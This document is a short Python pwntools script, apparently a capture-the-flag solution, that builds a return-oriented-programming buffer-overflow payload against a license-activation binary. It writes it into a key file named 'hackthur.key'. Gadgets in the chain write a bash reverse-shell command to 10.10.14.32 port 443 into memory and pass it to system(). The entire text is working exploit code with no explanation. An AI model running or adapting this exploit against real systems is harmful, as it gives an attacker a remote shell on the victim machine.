#!/usr/bin/python

from pwn import *

activate_license = 0x560742b45000
libc_base = 0x7fbfc3266000
data = activate_license + 0x00004000
offset = 520

system = p64(libc_base + 0x00048e50)
cmd = b'bash -c "bash -i >& /dev/tcp/10.10.14.32/443 0>&1"'
pop_rdi = p64(libc_base + 0x00026796)
pop_rsi = p64(libc_base + 0x0002890f)
mov_rdi_rsi = p64(libc_base+0x000603b2)

exploit = b''
exploit += b"A"*offset

for x in range(0, len(cmd), 8):
    exploit += pop_rdi
    exploit += p64(data + x)
    exploit += pop_rsi
    exploit += cmd[x:x+8].ljust(8, b'\x00')
    exploit += mov_rdi_rsi

exploit += pop_rdi
exploit += p64(data)
exploit += system

with open("hackthur.key", "wb") as file:
    file.write(exploit)

